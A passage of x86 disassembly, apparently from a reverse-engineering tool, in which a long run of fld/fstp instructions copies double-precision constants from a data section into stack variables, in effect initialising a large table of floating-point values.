		fld	ds:dbl_424C08
		fstp	[ebp+var_1188]
		fld	ds:dbl_424840
		fstp	[ebp+var_1180]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1178]
		fld	ds:dbl_424C20
		fstp	[ebp+var_1170]
		fld	ds:dbl_424C18
		fstp	[ebp+var_1168]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_1160]
		fld	ds:dbl_424720
		fstp	[ebp+var_1158]
		fld	ds:dbl_424648
		fstp	[ebp+var_1150]
		fld	ds:dbl_424588
		fstp	[ebp+var_1148]
		fld	ds:dbl_424748
		fstp	[ebp+var_1140]
		fld	ds:dbl_424960
		fstp	[ebp+var_1138]
		fld	ds:dbl_424568
		fstp	[ebp+var_1130]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1128]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_1120]
		fld	ds:dbl_424B50
		fstp	[ebp+var_1118]
		fld	ds:dbl_424B88
		fstp	[ebp+var_1110]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1108]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1100]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_10F8]
		fld	ds:dbl_424B48
		fstp	[ebp+var_10F0]
		fld	ds:dbl_424648
		fstp	[ebp+var_10E8]
		fld	ds:dbl_424468
		fstp	[ebp+var_10E0]
		fld	ds:dbl_424648
		fstp	[ebp+var_10D8]
		fld	ds:dbl_424628
		fstp	[ebp+var_10D0]
		fld	ds:dbl_424990
		fstp	[ebp+var_10C8]
		fld	ds:dbl_424A38
		fstp	[ebp+var_10C0]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_10B8]
		fld	ds:dbl_424B70
		fstp	[ebp+var_10B0]
		fld	ds:dbl_424B38
		fstp	[ebp+var_10A8]
		fld	ds:dbl_424928
		fstp	[ebp+var_10A0]
		fld	ds:dbl_424888
		fstp	[ebp+var_1098]
		fld	ds:dbl_424818
		fstp	[ebp+var_1090]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_1088]
		fld	ds:dbl_424720
		fstp	[ebp+var_1080]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_1078]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_1070]
		fld	ds:dbl_424910
		fstp	[ebp+var_1068]
		fld	ds:dbl_424540
		fstp	[ebp+var_1060]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_1058]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_1050]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1048]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_1040]
		fld	ds:dbl_424480
		fstp	[ebp+var_1038]
		fld	ds:dbl_424878
		fstp	[ebp+var_1030]
		fld	ds:dbl_424998
		fstp	[ebp+var_1028]
		fld	ds:dbl_424938
		fstp	[ebp+var_1020]
		fld	ds:dbl_424B28
		fstp	[ebp+var_1018]
		fld	ds:dbl_424760
		fstp	[ebp+var_1010]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_1008]
		fld1
		fstp	[ebp+var_1000]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_FF8]
		fld	ds:dbl_424478
		fstp	[ebp+var_FF0]
		fld	ds:dbl_424768
		fstp	[ebp+var_FE8]
		fld	ds:dbl_424760
		fstp	[ebp+var_FE0]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_FD8]
		fld	ds:dbl_424B60
		fstp	[ebp+var_FD0]
		fld	ds:dbl_424830
		fstp	[ebp+var_FC8]
		fld	ds:dbl_424B88
		fstp	[ebp+var_FC0]
		fld	ds:dbl_424520
		fstp	[ebp+var_FB8]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_FB0]
		fld	ds:dbl_424B98
		fstp	[ebp+var_FA8]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_FA0]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_F98]
		fld	ds:dbl_424750
		fstp	[ebp+var_F90]
		fld	ds:dbl_424B38
		fstp	[ebp+var_F88]
		fld	ds:dbl_424A98
		fstp	[ebp+var_F80]
		fld	ds:dbl_424908
		fstp	[ebp+var_F78]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_F70]
		fld	ds:dbl_424958
		fstp	[ebp+var_F68]
		fld	ds:dbl_424A90
		fstp	[ebp+var_F60]
		fld	ds:dbl_424B00
		fstp	[ebp+var_F58]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_F50]
		fld	ds:dbl_424648
		fstp	[ebp+var_F48]
		fld	ds:dbl_424A38
		fstp	[ebp+var_F40]
		fld	ds:dbl_424940
		fstp	[ebp+var_F38]
		fld	ds:dbl_424770
		fstp	[ebp+var_F30]
		fld	ds:dbl_424918
		fstp	[ebp+var_F28]
		fld	ds:dbl_424638
		fstp	[ebp+var_F20]
		fld	ds:dbl_424848
		fstp	[ebp+var_F18]
		fld	ds:dbl_424698
		fstp	[ebp+var_F10]
		fld	ds:dbl_424560
		fstp	[ebp+var_F08]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_F00]
		fld	ds:dbl_424628
		fstp	[ebp+var_EF8]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_EF0]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_EE8]
		fld	ds:dbl_424858
		fstp	[ebp+var_EE0]
		fld	ds:dbl_424438
		fstp	[ebp+var_ED8]
		fld	ds:dbl_424588
		fstp	[ebp+var_ED0]
		fld	ds:dbl_424608
		fstp	[ebp+var_EC8]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_EC0]
		fld	ds:dbl_424678
		fstp	[ebp+var_EB8]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_EB0]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_EA8]
		fld	ds:dbl_424560
		fstp	[ebp+var_EA0]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_E98]
		fld	ds:dbl_424460
		fstp	[ebp+var_E90]
		fld	ds:dbl_424458
		fstp	[ebp+var_E88]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_E80]
		fld	ds:dbl_424C28
		fstp	[ebp+var_E78]
		fld	ds:dbl_424790
		fstp	[ebp+var_E70]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_E68]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_E60]
		fld	ds:dbl_424938
		fstp	[ebp+var_E58]
		fld	ds:dbl_424548
		fstp	[ebp+var_E50]
		fld	ds:dbl_424A00
		fstp	[ebp+var_E48]
		fld	ds:dbl_424780
		fstp	[ebp+var_E40]
		fld	ds:dbl_424898
		fstp	[ebp+var_E38]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_E30]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_E28]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_E20]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_E18]
		fld	ds:dbl_424988
		fstp	[ebp+var_E10]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_E08]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_E00]
		fldz
		fstp	[ebp+var_DF8]
		fld	ds:dbl_424B30
		fstp	[ebp+var_DF0]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_DE8]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_DE0]
		fld	ds:dbl_424710
		fstp	[ebp+var_DD8]
		fld	ds:dbl_424A48
		fstp	[ebp+var_DD0]
		fld	ds:dbl_424600
		fstp	[ebp+var_DC8]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_DC0]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_DB8]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_DB0]
		fld	ds:dbl_424918
		fstp	[ebp+var_DA8]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_DA0]
		fld	ds:dbl_424790
		fstp	[ebp+var_D98]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_D90]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_D88]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_D80]
		fld	ds:dbl_424960
		fstp	[ebp+var_D78]
		fld	ds:dbl_424A08
		fstp	[ebp+var_D70]
		fld	ds:dbl_424580
		fstp	[ebp+var_D68]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_D60]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_D58]
		fld	ds:dbl_424998
		fstp	[ebp+var_D50]
		fld	ds:dbl_424558
		fstp	[ebp+var_D48]
		fld	ds:dbl_424A48
		fstp	[ebp+var_D40]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_D38]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_D30]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_D28]
		fld	ds:dbl_424778
		fstp	[ebp+var_D20]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_D18]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_D10]
		fld	ds:dbl_424648
		fstp	[ebp+var_D08]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_D00]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_CF8]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_CF0]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_CE8]
		fld	ds:dbl_424520
		fstp	[ebp+var_CE0]
		fld	ds:dbl_424760
		fstp	[ebp+var_CD8]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_CD0]
		fld	ds:dbl_424868
		fstp	[ebp+var_CC8]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_CC0]
		fld	ds:dbl_424A70
		fstp	[ebp+var_CB8]
		fld	ds:dbl_424B40
		fstp	[ebp+var_CB0]
		fld	ds:dbl_424980
		fstp	[ebp+var_CA8]
		fld	ds:dbl_424850
		fstp	[ebp+var_CA0]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_C98]
		fld	ds:dbl_424510
		fstp	[ebp+var_C90]
		fld	ds:dbl_424710
		fstp	[ebp+var_C88]
		fld	ds:dbl_424B48
		fstp	[ebp+var_C80]
		fld	ds:dbl_424688
		fstp	[ebp+var_C78]
		fld	ds:dbl_424B60
		fstp	[ebp+var_C70]
		fld	ds:dbl_424870
		fstp	[ebp+var_C68]
		fld	ds:dbl_424708
		fstp	[ebp+var_C60]
		fld	ds:dbl_424B78
		fstp	[ebp+var_C58]
		fld	ds:dbl_424A80
		fstp	[ebp+var_C50]
		fld	ds:dbl_424578
		fstp	[ebp+var_C48]
		fld	ds:dbl_424B50
		fstp	[ebp+var_C40]
		fld	ds:dbl_424A98
		fstp	[ebp+var_C38]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_C30]
		fld	ds:dbl_424858
		fstp	[ebp+var_C28]
		fld	ds:dbl_424488
		fstp	[ebp+var_C20]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_C18]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_C10]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_C08]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_C00]
		fld	ds:dbl_424750
		fstp	[ebp+var_BF8]
		fld	ds:dbl_424B38
		fstp	[ebp+var_BF0]
		fld	ds:dbl_424C20
		fstp	[ebp+var_BE8]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_BE0]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_BD8]
		fld	ds:dbl_424490
		fstp	[ebp+var_BD0]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_BC8]
		fld	ds:dbl_424B30
		fstp	[ebp+var_BC0]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_BB8]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_BB0]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_BA8]
		fld	ds:dbl_424A60
		fstp	[ebp+var_BA0]
		fld	ds:dbl_424500
		fstp	[ebp+var_B98]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_B90]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_B88]
		fld	ds:dbl_424A30
		fstp	[ebp+var_B80]
		fld	ds:dbl_424B30
		fstp	[ebp+var_B78]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_B70]
		fld	ds:dbl_424788
		fstp	[ebp+var_B68]
		fld	ds:dbl_424518
		fstp	[ebp+var_B60]
		fld	ds:dbl_424450
		fstp	[ebp+var_B58]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_B50]
		fld	ds:dbl_424868
		fstp	[ebp+var_B48]
		fld	ds:dbl_424640
		fstp	[ebp+var_B40]
		fld	ds:dbl_424698
		fstp	[ebp+var_B38]
		fld	ds:dbl_424550
		fstp	[ebp+var_B30]
		fld	ds:dbl_424558
		fstp	[ebp+var_B28]
		fld	ds:dbl_424760
		fstp	[ebp+var_B20]
		fld	ds:dbl_424860
		fstp	[ebp+var_B18]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_B10]
		fld	ds:dbl_424A60
		fstp	[ebp+var_B08]
		fld	ds:dbl_424980
		fstp	[ebp+var_B00]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_AF8]
		fld	ds:dbl_424A58
		fstp	[ebp+var_AF0]
		fld	ds:dbl_424A38
		fstp	[ebp+var_AE8]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_AE0]
		fld	ds:dbl_424580
		fstp	[ebp+var_AD8]
		fld	ds:dbl_424480
		fstp	[ebp+var_AD0]
		fld	ds:dbl_424B30
		fstp	[ebp+var_AC8]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_AC0]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_AB8]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_AB0]
		fld	ds:dbl_424898
		fstp	[ebp+var_AA8]
		fld	ds:dbl_424780
		fstp	[ebp+var_AA0]
		fld	ds:dbl_424748
		fstp	[ebp+var_A98]
		fld	ds:dbl_424B30
		fstp	[ebp+var_A90]
		fld	ds:dbl_424C20
		fstp	[ebp+var_A88]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_A80]
		fld	ds:dbl_424750
		fstp	[ebp+var_A78]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_A70]
		fld	ds:dbl_424920
		fstp	[ebp+var_A68]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_A60]
		fld	ds:dbl_424A00
		fstp	[ebp+var_A58]
		fld	ds:dbl_424738
		fstp	[ebp+var_A50]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_A48]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_A40]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_A38]
		fld	ds:dbl_424558
		fstp	[ebp+var_A30]
		fld	ds:dbl_424490
		fstp	[ebp+var_A28]
		fld	ds:dbl_424520
		fstp	[ebp+var_A20]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_A18]
		fld	ds:dbl_424548
		fstp	[ebp+var_A10]
		fld	ds:dbl_424458
		fstp	[ebp+var_A08]
		fld	ds:dbl_424A30
		fstp	[ebp+var_A00]
		fld	ds:dbl_424790
		fstp	[ebp+var_9F8]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_9F0]
		fld	ds:dbl_424820
		fstp	[ebp+var_9E8]
		fld	ds:dbl_424558
		fstp	[ebp+var_9E0]
		fld	ds:dbl_424A40
		fstp	[ebp+var_9D8]
		fld	ds:dbl_424680
		fstp	[ebp+var_9D0]
		fld	ds:dbl_424700
		fstp	[ebp+var_9C8]
		fld	ds:dbl_424B88
		fstp	[ebp+var_9C0]
		fld	ds:dbl_424850
		fstp	[ebp+var_9B8]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_9B0]
		fld	ds:dbl_424C10
		fstp	[ebp+var_9A8]
		fld	ds:dbl_424588
		fstp	[ebp+var_9A0]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_998]
		fld	ds:dbl_424870
		fstp	[ebp+var_990]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_988]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_980]
		fld	ds:dbl_424440
		fstp	[ebp+var_978]
		fld	ds:dbl_424980
		fstp	[ebp+var_970]
		fld	ds:dbl_424C28
		fstp	[ebp+var_968]
		fld	ds:dbl_424B80
		fstp	[ebp+var_960]
		fld	ds:dbl_424640
		fstp	[ebp+var_958]
		fld	ds:dbl_424848
		fstp	[ebp+var_950]
		fld	ds:dbl_424908
		fstp	[ebp+var_948]
		fld	ds:dbl_424930
		fstp	[ebp+var_940]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_938]
		fld	ds:dbl_424810
		fstp	[ebp+var_930]
		fld	ds:dbl_424810
		fstp	[ebp+var_928]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_920]
		fld	ds:dbl_424648
		fstp	[ebp+var_918]
		fld	ds:dbl_424940
		fstp	[ebp+var_910]
		fld	ds:dbl_424968
		fstp	[ebp+var_908]
		fld	ds:dbl_424958
		fstp	[ebp+var_900]
		fld	ds:dbl_424570
		fstp	[ebp+var_8F8]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_8F0]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_8E8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_8E0]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_8D8]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_8D0]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_8C8]
		fld	ds:dbl_424828
		fstp	[ebp+var_8C0]
		fld	ds:dbl_424A18
		fstp	[ebp+var_8B8]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_8B0]
		fld	ds:dbl_424488
		fstp	[ebp+var_8A8]
		fld	ds:dbl_424B88
		fstp	[ebp+var_8A0]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_898]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_890]
		fld	ds:dbl_424548
		fstp	[ebp+var_888]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_880]
		fld	ds:dbl_424590
		fstp	[ebp+var_878]
		fld	ds:dbl_424810
		fstp	[ebp+var_870]
		fld	ds:dbl_424838
		fstp	[ebp+var_868]
		fld	ds:dbl_424548
		fstp	[ebp+var_860]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_858]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_850]
		fld	ds:dbl_424518
		fstp	[ebp+var_848]
		fld	ds:dbl_424788
		fstp	[ebp+var_840]
		fld	ds:dbl_424780
		fstp	[ebp+var_838]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_830]
		fld	ds:dbl_424B38
		fstp	[ebp+var_828]
		fld	ds:dbl_424438
		fstp	[ebp+var_820]
		fld	ds:dbl_424698
		fstp	[ebp+var_818]
		fld	ds:dbl_424678
		fstp	[ebp+var_810]
		fld	ds:dbl_424C00
		fstp	[ebp+var_808]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_800]
		fld	ds:dbl_424728
		fstp	[ebp+var_7F8]
		fld	ds:dbl_424A58
		fstp	[ebp+var_7F0]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_7E8]
		fld	ds:dbl_424638
		fstp	[ebp+var_7E0]
		fld	ds:dbl_424C18
		fstp	[ebp+var_7D8]
		fld	ds:dbl_424520
		fstp	[ebp+var_7D0]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_7C8]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_7C0]
		fld	ds:dbl_424518
		fstp	[ebp+var_7B8]
		fld	ds:dbl_424718
		fstp	[ebp+var_7B0]
		fld	ds:dbl_424878
		fstp	[ebp+var_7A8]
		fld	ds:dbl_424950
		fstp	[ebp+var_7A0]
		fld	ds:dbl_424A48
		fstp	[ebp+var_798]
		fld	ds:dbl_424A18
		fstp	[ebp+var_790]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_788]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_780]
		fld	ds:dbl_424950
		fstp	[ebp+var_778]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_770]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_768]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_760]
		fld	ds:dbl_424928
		fstp	[ebp+var_758]
		fld	ds:dbl_424528
		fstp	[ebp+var_750]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_748]
		fld	ds:dbl_424890
		fstp	[ebp+var_740]
		fld	ds:dbl_424728
		fstp	[ebp+var_738]
		fld	ds:dbl_424A30
		fstp	[ebp+var_730]
		fld	ds:dbl_424648
		fstp	[ebp+var_728]
		fld	ds:dbl_424698
		fstp	[ebp+var_720]
		fld	ds:dbl_424900
		fstp	[ebp+var_718]
		fld	ds:dbl_424440
		fstp	[ebp+var_710]
		fld	ds:dbl_424B08
		fstp	[ebp+var_708]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_700]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_6F8]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_6F0]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_6E8]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_6E0]
		fld	ds:dbl_424448
		fstp	[ebp+var_6D8]
		fld	ds:dbl_424B78
		fstp	[ebp+var_6D0]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_6C8]
		fld	ds:dbl_424648
		fstp	[ebp+var_6C0]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_6B8]
		fld	ds:dbl_424890
		fstp	[ebp+var_6B0]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_6A8]
		fld	ds:dbl_424448
		fstp	[ebp+var_6A0]
		fld	ds:dbl_424678
		fstp	[ebp+var_698]
		fld	ds:dbl_424A10
		fstp	[ebp+var_690]
		fld	ds:dbl_424798
		fstp	[ebp+var_688]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_680]
		fld	ds:dbl_424520
		fstp	[ebp+var_678]
		fld	ds:dbl_424B88
		fstp	[ebp+var_670]
		fld	ds:dbl_424B90
		fstp	[ebp+var_668]
		fld	ds:dbl_424448
		fstp	[ebp+var_660]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_658]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_650]
		fld	ds:dbl_424C18
		fstp	[ebp+var_648]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_640]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_638]
		fld	ds:dbl_424B58
		fstp	[ebp+var_630]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_628]
		fld	ds:dbl_424B88
		fstp	[ebp+var_620]
		fld	ds:dbl_424530
		fstp	[ebp+var_618]
		fld	ds:dbl_424800
		fstp	[ebp+var_610]
		fld	ds:dbl_424598
		fstp	[ebp+var_608]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_600]
		fld	ds:dbl_424B88
		fstp	[ebp+var_5F8]
		fld	ds:dbl_424830
		fstp	[ebp+var_5F0]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_5E8]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_5E0]
		fld	ds:dbl_424450
		fstp	[ebp+var_5D8]
		fld	ds:dbl_424B60
		fstp	[ebp+var_5D0]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_5C8]
		fld	ds:dbl_424A80
		fstp	[ebp+var_5C0]
		fld	ds:dbl_424A78
		fstp	[ebp+var_5B8]
		fld	ds:dbl_424870
		fstp	[ebp+var_5B0]
		fld	ds:dbl_424598
		fstp	[ebp+var_5A8]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_5A0]
		fld	ds:dbl_424478
		fstp	[ebp+var_598]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_590]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_588]
		fld	ds:dbl_424550
		fstp	[ebp+var_580]
		fld	ds:dbl_424978
		fstp	[ebp+var_578]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_570]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_568]
		fld	ds:dbl_424438
		fstp	[ebp+var_560]
		fld	ds:dbl_424718
		fstp	[ebp+var_558]
		fld	ds:dbl_424720
		fstp	[ebp+var_550]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_548]
		fld	ds:dbl_424988
		fstp	[ebp+var_540]
		fld	ds:dbl_424678
		fstp	[ebp+var_538]
		fld	ds:dbl_424B68
		fstp	[ebp+var_530]
		fld	ds:dbl_424810
		fstp	[ebp+var_528]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_520]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_518]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_510]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_508]
		fld	ds:dbl_424B18
		fstp	[ebp+var_500]
		fld	ds:dbl_424460
		fstp	[ebp+var_4F8]
		fld	ds:dbl_424838
		fstp	[ebp+var_4F0]
		fld	ds:dbl_424560
		fstp	[ebp+var_4E8]
		fld	ds:dbl_424A68
		fstp	[ebp+var_4E0]
		fld	ds:dbl_424750
		fstp	[ebp+var_4D8]
		fld	ds:dbl_424720
		fstp	[ebp+var_4D0]
		fld	ds:dbl_424880
		fstp	[ebp+var_4C8]
		fld	ds:dbl_424B40
		fstp	[ebp+var_4C0]
		fld	ds:dbl_424640
		fstp	[ebp+var_4B8]
		fld	ds:dbl_424B60
		fstp	[ebp+var_4B0]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_4A8]
		fld	ds:dbl_424998
		fstp	[ebp+var_4A0]
		fld	ds:dbl_424808
		fstp	[ebp+var_498]
		fld	ds:dbl_424830
		fstp	[ebp+var_490]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_488]
		fld	ds:dbl_424870
		fstp	[ebp+var_480]
		fld	ds:dbl_424828
		fstp	[ebp+var_478]
		fld	ds:dbl_424538
		fstp	[ebp+var_470]
		fld	ds:dbl_424430
		fstp	[ebp+var_468]
		fld	ds:dbl_424770
		fstp	[ebp+var_460]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_458]
		fld	ds:dbl_424A08
		fstp	[ebp+var_450]
		fld	ds:dbl_424A20
		fstp	[ebp+var_448]
		fld	ds:dbl_424978
		fstp	[ebp+var_440]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_438]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_430]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_428]
		fld	ds:dbl_424880
		fstp	[ebp+var_420]
		fld	ds:dbl_424438
		fstp	[ebp+var_418]
		fld	ds:dbl_424898
		fstp	[ebp+var_410]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_408]
		fld	ds:dbl_424490
		fstp	[ebp+var_400]
		fld	ds:dbl_424990
		fstp	[ebp+var_3F8]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_3F0]
		fld	ds:dbl_424C28
		fstp	[ebp+var_3E8]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_3E0]
		fld	ds:dbl_424610
		fstp	[ebp+var_3D8]
		fld	ds:dbl_424798
		fstp	[ebp+var_3D0]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_3C8]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_3C0]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_3B8]
		fld	ds:dbl_424770
		fstp	[ebp+var_3B0]
		fld	ds:dbl_424908
		fstp	[ebp+var_3A8]
		fld	ds:dbl_424550
		fstp	[ebp+var_3A0]
		fld	ds:dbl_424868
		fstp	[ebp+var_398]
		fld	ds:dbl_424728
		fstp	[ebp+var_390]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_388]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_380]
		fld	ds:dbl_424588
		fstp	[ebp+var_378]
		fld	ds:dbl_424470
		fstp	[ebp+var_370]
		fld	ds:dbl_424588
		fstp	[ebp+var_368]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_360]
		fld	ds:dbl_424B30
		fstp	[ebp+var_358]
		fld	ds:dbl_424498
		fstp	[ebp+var_350]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_348]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_340]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_338]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_330]
		fld	ds:dbl_424578
		fstp	[ebp+var_328]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_320]
		fld	ds:dbl_424960
		fstp	[ebp+var_318]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_310]
		fld	ds:dbl_424A80
		fstp	[ebp+var_308]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_300]
		fld	ds:dbl_424718
		fstp	[ebp+var_2F8]
		fld	ds:dbl_424730
		fstp	[ebp+var_2F0]
		fld	ds:dbl_424848
		fstp	[ebp+var_2E8]
		fld	ds:dbl_424B70
		fstp	[ebp+var_2E0]
		fld	ds:dbl_424810
		fstp	[ebp+var_2D8]
		fld	ds:dbl_424618
		fstp	[ebp+var_2D0]
		fld	ds:dbl_424870
		fstp	[ebp+var_2C8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_2C0]
		fld	ds:dbl_424958
		fstp	[ebp+var_2B8]
		fld	ds:dbl_424580
		fstp	[ebp+var_2B0]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_2A8]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_2A0]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_298]
		fld	ds:dbl_424640
		fstp	[ebp+var_290]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_288]
		fld	ds:dbl_424590
		fstp	[ebp+var_280]
		fld	ds:dbl_424A68
		fstp	[ebp+var_278]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_270]
		fld	ds:dbl_424838
		fstp	[ebp+var_268]
